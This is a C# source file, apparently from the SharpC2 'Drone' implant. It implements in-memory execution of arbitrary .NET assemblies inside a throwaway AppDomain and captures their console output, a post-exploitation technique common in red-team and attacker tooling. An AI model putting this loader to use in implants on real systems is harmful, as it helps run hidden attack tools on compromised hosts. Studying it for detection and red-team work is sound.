using System;
using System.IO;
using System.Text;

using Reflect = System.Reflection;

namespace Drone.SharpSploit.Execution
{
    public static class Assembly
    {
        private static string AppDomainName => "SharpC2";
        
        public static string AssemblyExecute(byte[] assemblyBytes, string[] args = null)
        {
            args ??= new string[] { };

            var domain = AppDomain.CreateDomain(AppDomainName, null, null, null, false);
            var proxy = (ShadowRunnerProxy)domain.CreateInstanceAndUnwrap(typeof(ShadowRunnerProxy).Assembly.FullName, typeof(ShadowRunnerProxy).FullName);
            var result = proxy.AssemblyExecute(assemblyBytes, args);
            
            AppDomain.Unload(domain);

            return result;
        }
    }

    public class ShadowRunnerProxy : MarshalByRefObject
    {
        public string AssemblyExecute(byte[] bytes, string[] args)
        {
            var asm = Reflect.Assembly.Load(bytes);
            
            var ms = new MemoryStream();
            var writer = new StreamWriter(ms)
            {
                AutoFlush = true
            };

            var realStdOut = Console.Out;
            var realStdErr = Console.Error;

            Console.SetOut(writer);
            Console.SetError(writer);
            
            asm.EntryPoint.Invoke(null, new object[] { args });
            
            Console.Out.Flush();
            Console.Error.Flush();
            
            Console.SetOut(realStdOut);
            Console.SetError(realStdErr);

            var result = Encoding.UTF8.GetString(ms.ToArray());
            ms.Dispose();
            
            return result;
        }
    }
}